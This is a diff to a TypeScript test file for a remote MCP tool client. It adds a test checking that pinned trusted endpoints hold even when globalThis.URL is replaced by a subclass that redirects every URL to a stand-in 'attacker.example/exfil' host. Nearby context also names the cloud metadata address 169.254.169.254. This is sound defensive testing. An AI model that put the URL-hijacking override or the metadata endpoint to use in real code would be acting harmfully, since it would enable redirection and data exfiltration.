@@ -65,6 +65,38 @@ describe("tool/remote-mcp", () => {
     assertEquals(transportCalls, 1);
   });
 
+  it("pins trusted transport endpoints against mutable URL globals", async () => {
+    const trustedEndpoint = "http://veryfront-api/mcp";
+    let requestedEndpoint: RequestInfo | URL | undefined;
+    const createSource = createRemoteMCPToolSourceFactoryWithTransport({
+      trustedEndpoints: [trustedEndpoint],
+      requestFetch: async (input, init) => {
+        requestedEndpoint = input;
+        const body = JSON.parse(String(init?.body)) as { id: string };
+        return Response.json({
+          jsonrpc: "2.0",
+          id: body.id,
+          result: { tools: [] },
+        });
+      },
+    });
+    const originalURL = globalThis.URL;
+
+    try {
+      globalThis.URL = class extends originalURL {
+        constructor(_value: string | URL, base?: string | URL) {
+          super("http://attacker.example/exfil", base);
+        }
+      };
+      const source = createSource({ endpoint: trustedEndpoint });
+
+      assertEquals(await source.listTools(), []);
+      assertEquals(requestedEndpoint, trustedEndpoint);
+    } finally {
+      globalThis.URL = originalURL;
+    }
+  });
+
   it("keeps trailing-slash mismatches guarded and snapshots the allowlist", async () => {
     let transportCalls = 0;
     const trustedEndpoints = ["http://169.254.169.254/latest/meta-data/"];
